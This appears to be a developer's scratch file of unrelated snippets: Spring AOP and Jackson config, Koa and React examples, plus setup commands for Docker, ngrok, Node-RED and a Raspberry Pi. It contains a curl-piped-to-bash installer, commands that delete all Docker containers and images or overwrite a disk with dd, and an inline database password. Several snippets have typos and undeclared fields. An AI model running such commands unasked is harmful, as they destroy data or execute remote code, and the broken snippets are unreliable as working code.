
    <depends>com.intellij.modules.lang</depends>
    <depends>com.intellij.modules.java</depends>
    <depends>com.intellij.modules.ultimate</depends>
    <depends>com.intellij.modules.idea</depends>
    <depends>com.intellij.modules.idea.ultimate</depends>

    <actions>
        <group id="design-patterns-group" text="Design Patterns" popup="true">
            <add-to-group group-id="EditorPopupMenu" anchor="first"/>
        </group>
        <action id="builderDesignPattern" class="ore.plugins.idea.design.patterns.action.BuilderAction"
                text="Builder"
                description="Implements builder design pattern">
            <add-to-group group-id="design-patterns-group" anchor="first"/>
        </action>
        <action id="singletonDesignPattern" class="ore.plugi ns.idea.design.patterns.action.SingletonAction"
                text="Singleton"
                description="Implements singleton design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="builderDesignPattern"/>
        </action>
        <action id="strategyDesignPattern" class="ore.plugins.idea.design.patterns.action.StrategyAction"
                text="Strategy"
                description="Implements strategy design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="singletonDesignPattern"/>
        </action>
        <action id="factoryDesignPattern" class="ore.plugins.idea.design.patterns.action.FactoryAction" text="Factory"
                description="Implements factory design pattern">
            <add-to-group group-id="design-patterns-group" anchor="last"/>
        </action>
    </actions>
</idea-plugin>

-------------------------------------------------------------------------------------------------------
<div id="root"></div>




.List {
  margin: 16px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
  grid-auto-rows: 60px;
  grid-gap: 16px;
}

.List__item {
  line-height: 60px;
  text-align: center;
  color: white;
  text-shadow: 1px 1px rgba(0, 0, 0, 0.5);
  box-shadow: 0px 1px 1px 0px rgba(0, 0, 0, 0.05);
}

/* Taken from https://clrs.cc/ */

.List__item--navy {
  background-color: #001f3f;
}

.List__item--blue {
  background-color: #0074d9;
}

.List__item--aqua {
  background-color: #7fdbff;
}

.List__item--teal {
  background-color: #39cccc;
}

.List__item--olive {
  background-color: #3d9970;
}

.List__item--green {
  background-color: #2ecc40;
}

.List__item--lime {
  background-color: #01ff70;
}

.List__item--yellow {
  background-color: #ffdc00;
}

.List__item--orange {
  background-color: #ff851b;
}

.List__item--red {
  background-color: #ff4136;
}

.List__item--maroon {
  background-color: #85144b;
}

.List__item--fuchsia {
  background-color: #f012be;
}

.List__item--purple {
  background-color: #b10dc9;
}

.List__item--black {
  background-color: #111111;
}

.List__item--gray {
  background-color: #aaaaaa;
}

.List__item--silver {
  background-color: #dddddd;
}




const { Fragment } = React;


// Implement a feature to allow item selection with the following requirements:
// 1. Clicking an item selects/unselects it.
// 2. Multiple items can be selected at a time.
// 3. Currently selected items should be visually highlighted.
// 4. Currently selected items' names should be shown at the top of the page.
// 5. Make sure to avoid unnecessary re-renders.

const List = ({ items }) => (
  <Fragment>
    <ul className="List">
      {items.map(item => (
        <li key={item.name} className={`List__item List__item--${item.color}`}>
          {item.name}
        </li>
      ))}
    </ul>
  </Fragment>
);

// ---------------------------------------
// Do NOT change anything below this line.
// ---------------------------------------

const sizes = ['tiny', 'small', 'medium', 'large', 'huge'];
const colors = ['navy', 'blue', 'aqua', 'teal', 'olive', 'green', 'lime', 'yellow', 'orange', 'red', 'maroon', 'fuchsia', 'purple', 'silver', 'gray', 'black'];
const fruits = ['apple', 'banana', 'watermelon', 'orange', 'peach', 'tangerine', 'pear', 'kiwi', 'mango', 'pineapple'];

const items = sizes.reduce(
  (items, size) => [
    ...items,
    ...fruits.reduce(
      (acc, fruit) => [
        ...acc,
        ...colors.reduce(
          (acc, color) => [
            ...acc,
            {
              name: `${size} ${color} ${fruit}`,
              color,
            },
          ],
          [],
        ),
      ],
      [],
    ),
  ],
  [],
);

ReactDOM.render(
  <List items={items}/>,
  document.getElementById('root')
);
-------------------------------------------------------------------------------------------------------
var map = new Map()
map.set('我是key','hello')
map.set('我是key2','world')
for(let [key,value] of map){
}
-------------------------------------------------------------------------------------------------------
let koa = require('koa');
let static = require('koa-static');
let router = require('koa-router');
let body = require('koa-body');
let path = require('path');
let fs = require('fs');
let os = require('os');

const Koa = require('koa');
const app = new Koa();
const fs = require('fs');
const router = require('koa-router'); //路由
const static = require('koa-static');
const path = require('path');

let handler = ctx=>{
   try{
    // ctx.request.accepts('html')   [browser要接收什么 mime类型的数据]
    //ctx.response.type ='xml' mime 类型 [xml,html,text,json,....]
    //ctx.response.body = "hello";  
    //ctx.response.body = fs.createReadStream('./hello.html'); //读取模板数据
    
    
    //ctx.request.path!=='/'    手动路由，高级的可以使用 koa-router
    
   
    //ctx.response.redirect('/'); //手动重定向方法
    
    //ctx.throw(500);  错误处理
    
    //ctx.response.status=404;
    //ctx.response.body = 'page not found';
       
   }catch(err){
       console.log(err);
       //error 发射事件
       
       ctx.app.emit('error',err,ctx);
   }
}




 /*
     app.use(router.get("/",home));
     app.use(router.get("/handler",handler'))
     app.use(router.get('/about',about));
     
     //路由方式 重定向
	  app.use(router.get("/admin",redirect));
    */

// console.log(path.join(__dirname)) //输出当前目录的绝对地址
//app.use(static(path.join(__dirname))).listen(3000);  //静态服务器



//error监听器

const main = ctx=>{
    ctx.throw(500);
}

app.on('error',(err,ctx)=>{
    console.error('server error',err);
})




//cookie 
const login = function(ctx){
    const n = Number(ctx.cookies.get('view')||0)+1;
   	ctx.cookie.set('view',n);
    ctx.response.body = n+'views';
}

//表单数据
const koaBody = require('koa-body');
const reg = ctx=>{
    const body = ctx.request.body;
    if(!body.name)ctx.throw(400,'.name required');
    ctx.body = {name:body.name};
    /*
    	curl 测试
       curl -X POST --data 'name=hello' 127.0.0.1:3000
       curl -X POST --data 'name' 127.0.0.1:3000  //name required
    */
}
app.use(koaBody());



//文件上传
const os = require ('os');
const path = require('path');
const koaBody = require('koa-body');

const main =async (ctx)=>{
    const tmpdir = os.tmpdir();
    const filePaths = [];
    const files = ctx.request.body.files||{};
    for(let key in files){
        const file = files[key];
        const filePath = path.join(tmpdir,file.name);
        const reader = fs.createReadStream(file.path);
        const writer = fs.createWriteStream(filePath);
        reader.pipe(writer);
        filePaths.push(filePath);
    }
    ctx.body=filePaths;
}
app.use(koaBody({multipart:true}));

//curl 模拟提交
curl --form upload=@/path/to/file.jpg http://127.0.0.1:3000


app.listen(3000);
-------------------------------------------------------------------------------------------------------
class FileLines implements Iterable<String> {
	private final File file;
	public Iterator<String> iterator() {
		return Arrays.asList(FileUtils.readLines(this.file)).iterator();
	}
}
class Between implements Number {
	private final Number number;
	Between(Number left, Number right, Number value) {
		this.number = new Min(new Max(left, x), right);
	}
	
	@Override
	public int intValue() {
		return this.num.intValue();
	}
}
class CachedNumber implements Number {
	private Number origin;
	private Collection<Integer> cache = new ArrayList<>(1);
	
	public CachedNumbee(final Number num) {
		this.origin = num;
	}
	public int intValue() {
		if(this.cached.isEmpty()) {
			this.cached.add(this.origin.intValue());
		}
		return this.cached.get(0);
	}
}
-------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.links.aspect;
//
//import lombok.extern.slf4j.Slf4j;
//import org.aspectj.lang.annotation.Aspect;
//import org.springframework.aop.AfterReturningAdvice;
//import org.springframework.aop.MethodBeforeAdvice;
//import org.springframework.aop.ThrowsAdvice;
//import org.springframework.stereotype.Component;
//
//import java.lang.reflect.Method;
//
//@Slf4j
//@Aspect
//@Component
//public class ExceptionHandler implements AfterReturningAdvice, MethodBeforeAdvice, ThrowsAdvice {
//
//    @Override
//    public void afterReturning(final Object o, final Method method, final Object[] os, final Object o1) {
//        log.debug("afterReturning: ", method.getName());
//    }
//
//    @Override
//    public void before(final Method method, final Object[] os, final Object o) {
//        log.debug("before: ", method.getName());
//    }
//
//    public void afterThrowing(final IllegalArgumentException ex) {
//        log.debug("afterThrowing: ", ex.getMessage());
//    }
//}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.*;
import org.springframework.stereotype.Component;

import java.util.Arrays;

/**
 * Base controllers logging REST Application handlers
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Slf4j
@Aspect
@Component
public class ExceptionResolver {

    @Before("@annotation(org.springframework.web.bind.annotation.RestControllerAdvice)")
    public void logBeforeController(final JoinPoint joinPoint) {
        log.debug("logBeforeController() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("Class Name :  " + joinPoint.getSignature().getDeclaringTypeName());
        log.debug("Arguments :  " + Arrays.toString(joinPoint.getArgs()));
        log.debug("Target class : " + joinPoint.getTarget().getClass().getName());
    }

    //    @After("restcontroller() && allMethod()")
//    public void logAfterController(final JoinPoint joinPoint) {
//        log.debug("logAfterController() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("Class Name :  " + joinPoint.getSignature().getDeclaringTypeName());
//        log.debug("Arguments :  " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("Target class : " + joinPoint.getTarget().getClass().getName());
//    }
//
//    @AfterReturning(pointcut = "restcontroller() && allMethod()", returning = "resultSet")
//    public void logAfterControllerReturning(final JoinPoint joinPoint, final Object resultSet) {
//        log.debug("logAfterReturningController() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("returned value: " + resultSet);
//    }
//
//    @AfterThrowing(pointcut = "restcontroller() && allMethod()", throwing = "error")
//    public void logAfterControllerThrowing(final JoinPoint joinPoint, final Throwable error) {
//        log.debug("logAfterControllerThrowing() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("exceptions: " + error);
//    }

    @AfterThrowing(pointcut = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", throwing = "error")
    public void logBeforeProxyController(final JoinPoint joinPoint, final Throwable error) {
        log.debug("logBefore() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
    }

//    @Around("@annotation(test) && allMethod()")
//    public Object logAroundController(final ProceedingJoinPoint joinPoint) throws Throwable {
//        log.debug("logControllerAround() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("logControllerAround before is running!");
//        final Object result = joinPoint.proceed();
//        log.debug("logControllerAround after is running!");
//        return result;
//    }

    @Pointcut("within(com.paragon.microservices.links.controller.TicketController)")
    public void stringProcessingMethods() {
    }

    @After("stringProcessingMethods()")
    public void logMethodCall(final JoinPoint jp) {
        final String methodName = jp.getSignature().getName();
        log.info("testing");
    }

    @AfterReturning(value = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", returning = "result")
    public void logBeforeProxyController(final JoinPoint joinPoint, final Object result) {
        log.debug("logBefore() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
    }

    //
//    @After("execution(* com.paragon.microservices.links.controller.*(..))")
//    public void logAfterProxyController(final JoinPoint joinPoint) {
//        log.debug("logAfter() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//
//    }
//
//    @AfterReturning(pointcut = "execution(* com.paragon.microservices.links.controller.*(..))", returning = "resultSet")
//    public void logAfterProxyControllerReturning(final JoinPoint joinPoint, final Object resultSet) {
//        log.debug("logAfterReturning() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("returned value: " + resultSet);
//    }
//
    @Around("@annotation(com.paragon.microservices.links.aspect.LogExecutionError)")
    public Object logExecutionTime(final ProceedingJoinPoint joinPoint) throws Throwable {
        final long start = System.currentTimeMillis();
        Object proceed = joinPoint.proceed();
        final long executionTime = System.currentTimeMillis() - start;
        System.out.println(joinPoint.getSignature() + " executed in " + executionTime + "ms");
        log.info("test");
        return proceed;
    }

    @AfterThrowing(pointcut = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", throwing = "error")
    public void logAfterProxyControllerThrowing(final JoinPoint joinPoint, final Throwable error) {
        log.debug("logAfterThrowing() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("exceptions: " + error);
    }

    @Around("execution(* com.paragon.microservices.links.controller.TicketController.*(..))")
    public Object logrAroundProxyController(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }
}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.stream.Collectors;

@Slf4j
@Aspect
@Component
public class MyAspect {

    @Pointcut("execution(protected * com.paragon.microservices.links.system.configuration.DefaultExceptionHandler.*(..))")
    public void callAtMyServicePublic() {
    }

    @Before("callAtMyServicePublic()")
    public void beforeCallAtMethod1(final JoinPoint jp) {
        final String args = Arrays.stream(jp.getArgs())
                .map(a -> a.toString())
                .collect(Collectors.joining(","));
        log.info("before " + jp.toString() + ", args=[" + args + "]");
    }

    @After("callAtMyServicePublic()")
    public void afterCallAt(JoinPoint jp) {
        log.info("after " + jp.toString());
    }
}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.springframework.context.annotation.Configuration;

@Slf4j
@Aspect
@Configuration
public class UserAccessAspect {

    @Before("execution(* com.paragon.microservices.links.controller.*.*(..))")
    public void before(JoinPoint joinPoint) {
        log.info(" Check for user access ");
        log.info(" Allowed execution for {}", joinPoint);
    }
}


@Pointcut("execution(* com.example.demoAspects.MyService.method1(..)) && args(list,..))")
public void callAtMyServiceMethod1(List<String> list) { }

   @Pointcut("execution(* com.example.demoAspects.MyService.check())")
    public void callAtMyServiceAfterReturning() { }
	
-------------------------------------------------------------------------------------------------------
    @Aspect
    @Component
    public class DeviceLogger {

    private static Logger logger = Logger.getLogger("Device");


        @Around("execution(* com.devicemachine.StateHandler.*(..))")
        public void log() {
            logger.info( "Logger" );
        }
}
-------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class LoggerApplication {

    private static Logger logger = Logger.getLogger("Device");


    public static void main(String[] args) {

        SpringApplication.run(LoggerApplication.class, args);

    }

    @PostConstruct
    public void log(){
        DeviceState s = DeviceState.BLOCKED;
        StateHandler<DeviceEvent> sh = new StateHandler<DeviceEvent>( s,
                                            Event.block(DeviceEvent.BLOCKED, "AuditMessage") );
        sh.handle(Event.block(DeviceEvent.UNBLOCKED, "AuditMessage"));
    }
}
-------------------------------------------------------------------------------------------------------
InsTream.rangeClosed(2, Integer.MAX_VALUE)
.filter()
.map(x -> x * x)
.limit(20)
.collect(LinkedList::new,
LinkedList::push,
LinkedList::addAll)
.forEach(System.out::println);
-------------------------------------------------------------------------------------------------------
ul {--accent-color: purple;}
ol {--accent-color: green;}
li{background: var(--accent-color);}
-------------------------------------------------------------------------------------------------------
/*
<figure>
	<img />
	<figurecaption></figurecaption>
</figure>
*/
-------------------------------------------------------------------------------------------------------
https://kodnito.com/posts/documenting-rest-api-using-microprofile-openapi-swagger-ui-payara-micro/
https://microprofile.io/2019/07/11/validate-your-microservices-with-microprofile-and-bean-validation/
-------------------------------------------------------------------------------------------------------

openapi: 3.0.0
info:
  title: This is my TODO application API Title
  description: This is my TODO application description
  license:
    name: Eclipse Public License - v 1.0
    url: https://www.eclipse.org/legal/epl-v10.html
  version: 1.0.0
servers:
- url: http://localhost:8080
-------------------------------------------------------------------------------------------------------
mvn archetype:generate -DarchetypeGroupId=fish.payara.maven.archetypes -DarchetypeArtifactId=payara-micro-maven-archetype -DarchetypeVersion=1.0.1 -DgroupId=fish.payara.micro -DartifactId=mp-openapi-example -Dversion=1.0-SNAPSHOT -Dpackage=com.kodnito.openapi.rest -Darchetype.interactive=false
-------------------------------------------------------------------------------------------------------
windows : set NODE_ENV=prod&&node index.js

Linux : export NODE_ENV=prod&&node index.js


console.log(process.env.NODE_ENV) //prod
-------------------------------------------------------------------------------------------------------
npm config set registry https://registry.npmjs.org/
-------------------------------------------------------------------------------------------------------
npm install -g create-react-app
yarn add webpack webpack-dev-server path
-------------------------------------------------------------------------------------------------------
sudo npm install -g angular-cli

ng new PROJECT_NAME
cd PROJECT_NAME
ng serve

# 这是生产构建
ng build --target=production --environment=prod
ng build --prod --env=prod
ng build --prod

# 这是开发构建
ng build --target=development --environment=dev
ng build --dev --e=dev
ng build --dev
ng build
-------------------------------------------------------------------------------------------------------
process.on('unhandleRejection,(reason,p)=>{
    console.log('未处理的 rejection:',p,'原因：',reason);
})
process.on('waring',(warning)=>{
    console.warn(warning.message);
    console.warn(warning.name);
    console.warn(warning.stack);
})
-------------------------------------------------------------------------------------------------------
let http = require('http');
let server = http.createServer();
server.on('request',function(req,res){
    res.writeHead(200,{'Content-type':'text/plain'});
    res.end('hello world');
}).listen(3000);
-------------------------------------------------------------------------------------------------------
const formidable = require('formidable');
let form = new formidable.IncomingForm();

form.encoding = 'utf-8';
form.uploadDir = "/uploadFile";
form.keepExtensions = true;


form.maxFieldsSize = 2*1024*1024; //2MB
form.maxFields = 1000;  //分段 0 = unlimited(无限)

form.hash=false; //上传文件的校验码 sha1 or md5
form.multiples=false; //是否支持多文件上传


// read

form.bytesReceived; //接收字节数
form.type;  //文件类型 mime
form.bytesExpected; //返回将要接收的表单数据大小

//form.parse(request,(err,fields,files)=>{ 
    console.log(JSON.stringify({fields:fields,fiels}))
})// parse upload file info


form.on('field')
-------------------------------------------------------------------------------------------------------
	/**
	 * Unique file identifier.
	 */
	 @url
	@JsonProperty("file_id")
	private String fileId;
	
	/**
	 * Optional. Document thumbnail as defined by sender.
	 */
	@JsonProperty("thumb")
	private PhotoSize thumb;
	
	/**
	 * Optional. Original filename as defined by sender.
	 */
	@JsonProperty("file_name")
	private String fileName;
	
	/**
	 * Optional. MIME type of the file as defined by sender.
	 */
	@JsonProperty("mime_type")
	private String mimeType;
	
	/**
	 * Optional. TelegramFile size.
	 */
	@JsonProperty("file_size")
	private Integer fileSize;
	
	/**
	 * Optional. File path. Use https://api.telegram.org/file/bot<token>/<file_path> to get the file.
	 */
	@JsonProperty("file_path")
	private String filePath;
	
	/**
	 * Total number of profile pictures the target user has.
	 */
	@JsonProperty("total_count")
	private int totalCount;
-------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonInclude.Include;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;

/**
 * Utility class to handle conversions between JSON and Java object and vice versa.
 */
public class JsonUtils
{
	public static <T> T toJavaObject(String json, Class<T> clazz) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.enable(DeserializationFeature.READ_ENUMS_USING_TO_STRING);
		return mapper.readValue(json, clazz);
	}
	
	public static <T, R> T toJavaObject(String json, TypeReference typeReference) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.enable(DeserializationFeature.READ_ENUMS_USING_TO_STRING);
		return mapper.readValue(json, typeReference);
	}
	
	public static String toJson(Object javaObject) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.setSerializationInclusion(Include.NON_NULL);
		mapper.enable(SerializationFeature.WRITE_ENUMS_USING_TO_STRING);
		return mapper.writeValueAsString(javaObject);
	}
}
-------------------------------------------------------------------------------------------------------
ngrok http 3000

ngrok http -auth "user:password" 3000
ngrok http -subdomain=thisisreallycool 3000

nano ~/.ngrok2/ngrok.yml
tunnels:
  cool:
    proto: http
    addr: 3000
    subdomain: thisisreallycool
ngrok start cool
-------------------------------------------------------------------------------------------------------
xzcat kali-$version-rpi2.img.xz | dd of=/dev/sdb bs=512k
-------------------------------------------------------------------------------------------------------
#!/bin/bash

docker container exec -i $(docker-compose ps -q mysql) mysql -uroot -pchangeme project < ../docker/mysql/oauth.sql

#!/bin/bash

# Delete all containers
docker rm $(docker ps -a -q)
# Delete all images
docker rmi $(docker images -q)

CREATE DATABASE IF NOT EXISTS `project` CHARACTER SET utf8 COLLATE utf8_general_ci;
GRANT ALL ON project.* TO 'db_user'@'%';
FLUSH PRIVILEGES;

heroku logs -tail -a mass-follower1
heroku restart -a mass-follower1
git push heroku master
--------------------------------------------------------------------------------------------------------
sudo npm install -g --unsafe-perm node-red
snap install node-red
sudo npm install -g --unsafe-perm node-red

bash <(curl -sL https://raw.githubusercontent.com/node-red/raspbian-deb-package/master/resources/update-nodejs-and-nodered)
sudo apt-get install build-essential
node-red-pi --max-old-space-size=256
sudo systemctl enable nodered.service
sudo systemctl disable nodered.service
If you are using the browser on the Pi desktop, you can open the address: http://localhost:1880.
--------------------------------------------------------------------------------------------------------
        @Override
        public String toString() {
            return MoreObjects.toStringHelper(this)
                    .add("from", from)
                    .add("to", to)
                    .add("cc", cc)
                    .add("subject", subject)
                    .add("body", body)
                    .omitNullValues()
                    .toString();
        }
--------------------------------------------------------------------------------------------------------
@Controller
public class CandidateMenuController extends AbstractController{



    @RequestMapping("/goToCandidateMenu")
    public String goToCandidateMenu() {
        return "candidateMenu";
    }

    @RequestMapping("/getAllCandidates")
    public String getAllCandidates(Model model) {
        model.addAttribute("candidates", candidateService.getAll());
        return "candidates";
    }

    @RequestMapping("/findById")
    public String findById(Model model, @RequestParam Integer id) {
        model.addAttribute("candidate", candidateService.findById(id));
        return "singleCandidate";
    }

    @RequestMapping("/loadCandidateById")
    public String loadCandidateById(Model model, @RequestParam Integer id, @RequestParam(required=false) String message) {
        model.addAttribute("candidate", candidateService.findById(id));
        model.addAttribute("vacancies",vacancyService.getAll());
        model.addAttribute("message",message);
        return "candidateDetails";
    }

    @ModelAttribute(value = "vacancies")
    public List<Vacancy> loadVacancies() {
        return vacancyService.getAll();
    }
    @ModelAttribute(value = "candidateFromRequest")
    public Candidate loadCandidateById(@RequestParam(required = false) Integer candidateId) {
        if (candidateId!= null)
            return candidateService.findById(candidateId);
        return null;
    }


    @ModelAttribute(value = "vacanciesForCandidate")
    public Set<Vacancy> vacanciesForCandidate(@RequestParam(required = false) List<Integer> vacanciesSelected,@ModelAttribute("vacancies")List<Vacancy> allVacancies ) {
        if (vacanciesSelected== null)
            return null;
        Set<Vacancy> returnList = new  HashSet<Vacancy>();
        for(Integer vacancyId:vacanciesSelected){
            for(Vacancy vacancy:allVacancies){
                if(vacancyId.equals(vacancy.getId())){
                    returnList.add(vacancy);
                    break;
                }
            }   
        }
        return returnList;
    }


    @RequestMapping("/findByName")
    public String findByName(Model model, @RequestParam String name) {
        model.addAttribute("candidates", candidateService.findByName(name));
        return "candidates";
    }

    @RequestMapping("/saveCandidate")
    public String saveCandidate(Model model,HttpServletRequest request,HttpResponse response
            ,@ModelAttribute("candidateFromRequest") Candidate candidateFromRequest
            ,@ModelAttribute("skillsIdList") Set<Skill> skills
           ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate
           ,RedirectAttributes redirectAttributes
            )
    {
//      candidateFromRequest.setSkills(skills);
//      candidateFromRequest.setVacancies(vacanciesForCandidate);
//      for(Vacancy vacancy:vacanciesForCandidate){
//          vacancy.getCandidates().add(candidateFromRequest);
//      }
//      candidateService.update(candidateFromRequest);
        candidateService.linkWith(candidateFromRequest, vacanciesForCandidate, skills);
        redirectAttributes.addAttribute("message", "Submitted Correctly");
        redirectAttributes.addAttribute("id",candidateFromRequest.getId());
        return "redirect:loadCandidateById";
    }

//  @RequestMapping("/addCandidate")
//  public ModelAndView addCandidate(Model model
//          ,@ModelAttribute Candidate myCandidate
//          ,@ModelAttribute("skillsIdList") Set<Skill> skills
//         ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate)
//  {
//      myCandidate.setSkills(skills);
//      myCandidate.setVacancies(vacanciesForCandidate);
//      candidateService.add(myCandidate);
//      ModelAndView modelAndView = new ModelAndView("redirect:candidateMenu");
//      //return "candidateMenu";
//      return modelAndView;
//  }

    @RequestMapping("/findBySkills")
    public String processSkill(Model model, @ModelAttribute SkillDTO skillDTO) {
        List<Integer> skills = skillDTO.getSkills();

        List<Candidate> candidates = candidateService.findBySkills(skills);
        model.addAttribute("candidates", candidates);
        return "candidates";
    }

    @RequestMapping("/loadSkillsAndGoToFindCandidates")
    public String loadSkillsAndGoToFindCandidates(Model model) {
        return "selectSkills";
    }
    @RequestMapping("/goToAddCandidate")
    public String addCandidate() {
        return "candidateDetailsAdd";
    }
     @ModelAttribute("myCandidate")
       public Candidate getCandidate() {
          return new Candidate();
     }
    @RequestMapping("/submitFormAdd")
    public ModelAndView submitFormAdd(Model model
            ,@ModelAttribute("myCandidate") @Valid Candidate myCandidate
            ,BindingResult result
            ,@ModelAttribute("skillsIdList") Set<Skill> skills
            ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate
            ,RedirectAttributes redirectAttributes){
         if(result.hasErrors()) {
                return new ModelAndView("candidateDetailsAdd");
         }
         myCandidate.setDate(new Date());
         candidateService.add(myCandidate);
         redirectAttributes.addAttribute("message", "added Correctly");
         redirectAttributes.addAttribute("id",myCandidate.getId());
         ModelAndView modelAndView = new ModelAndView("redirect:loadCandidateById");
            //return "candidateMenu";
        return modelAndView;
        // return "candidateMenu";
    }

}

class SkillDTO {

    private List<Integer> skills;

    public List<Integer> getSkills() {
        return skills;
    }

    public void setSkills(List<Integer> skills) {
        this.skills = skills;
    }
}
java -jar proguard.jar ..... -obfuscationdictionary compact.txt
--------------------------------------------------------------------------------------------------------
spring.data.redis.repositories.enabled = false

https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#repositories.multiple-modules
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableJpaRepositories
@EnableTransactionManagement
class ApplicationConfig {

  @Bean
  public DataSource dataSource() {

    EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
    return builder.setType(EmbeddedDatabaseType.HSQL).build();
  }

  @Bean
  public LocalContainerEntityManagerFactoryBean entityManagerFactory() {

    HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
    vendorAdapter.setGenerateDdl(true);

    LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();
    factory.setJpaVendorAdapter(vendorAdapter);
    factory.setPackagesToScan("com.acme.domain");
    factory.setDataSource(dataSource());
    return factory;
  }

  @Bean
  public PlatformTransactionManager transactionManager(EntityManagerFactory entityManagerFactory) {

    JpaTransactionManager txManager = new JpaTransactionManager();
    txManager.setEntityManagerFactory(entityManagerFactory);
    return txManager;
  }
}
--------------------------------------------------------------------------------------------------------
touch /volumes/boot/ssh

wpa_supplicant.conf
country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network = {
	ssid = ""
	psk = ""
}

git clone https://github.com/respeaker/seeed-voicecard
cd seeed-voicecard
sudo ./install.sh
sudo reboot
aplay -l
arecord -l

sudo apt-get update
sudo apt-get install python3-dev python3-venv
python3 -m venv env
env/bin/python -m pip install --upgrade pip setuptools wheel
source /env/bin/activate

python -m pip install --upgrade google-assistant-library
--------------------------------------------------------------------------------------------------------
@Retry(maxRetries = 2)
@CircuitBreaker
--------------------------------------------------------------------------------------------------------
public class CompanyObjectMapper extends ObjectMapper {
    public CompanyObjectMapper() {
        super();
        setVisibilityChecker(getSerializationConfig()
                .getDefaultVisibilityChecker()
                .withCreatorVisibility(JsonAutoDetect.Visibility.NONE)
                .withFieldVisibility(JsonAutoDetect.Visibility.NONE)
                .withGetterVisibility(JsonAutoDetect.Visibility.NONE)
                .withIsGetterVisibility(JsonAutoDetect.Visibility.NONE)
                .withSetterVisibility(JsonAutoDetect.Visibility.DEFAULT));
    }
}
--------------------------------------------------------------------------------------------------------
spring.jackson.deserialization.<feature_name>=true|false
spring.jackson.generator.<feature_name>=true|false
spring.jackson.mapper.<feature_name>=true|false
spring.jackson.parser.<feature_name>=true|false
spring.jackson.serialization.<feature_name>=true|false
spring.jackson.default-property-inclusion=always|non_null|non_absent|non_default|non_empty

@Bean
public Jackson2ObjectMapperBuilder jacksonBuilder() {
    Jackson2ObjectMapperBuilder builder = new Jackson2ObjectMapperBuilder();
    builder.indentOutput(true).dateFormat(new SimpleDateFormat("yyyy-MM-dd"));
    return builder;
}
--------------------------------------------------------------------------------------------------------
public class SpringDataRestCustomization implements RepositoryRestConfigurer {
    @Override
    public void configureRepositoryRestConfiguration(RepositoryRestConfiguration config) {
        config.withEntityLookup()
        .forRepository(UserRepo.class, User::getUsername, UserRepo::findByUsername);
    }
}

@RepositoryRestResource(exported = true)
public interface UserRepo extends PagingAndSortingRepository<User, Long> {
    Optional<User> findByUsername(String username);
}
--------------------------------------------------------------------------------------------------------
@Override
public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
    ObjectMapper objectMapper = Jackson2ObjectMapperBuilder.json().modules(new JavaTimeModule(), new Jdk8Module()).build()
            .configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
    converters.add(new MappingJackson2HttpMessageConverter(objectMapper));
}
--------------------------------------------------------------------------------------------------------
public interface UserRepository extends JpaRepository<User, Long> {

  @Query(value = "SELECT * FROM USERS WHERE LASTNAME = ?1",
    countQuery = "SELECT count(*) FROM USERS WHERE LASTNAME = ?1",
    nativeQuery = true)
  Page<User> findByLastname(String lastname, Pageable pageable);
}
--------------------------------------------------------------------------------------------------------
sudo gattool install
wsimport src/main/resources/wsdl/simple-ws.wsdl -s src/main/gen -Xnocompile
--------------------------------------------------------------------------------------------------------
@Component
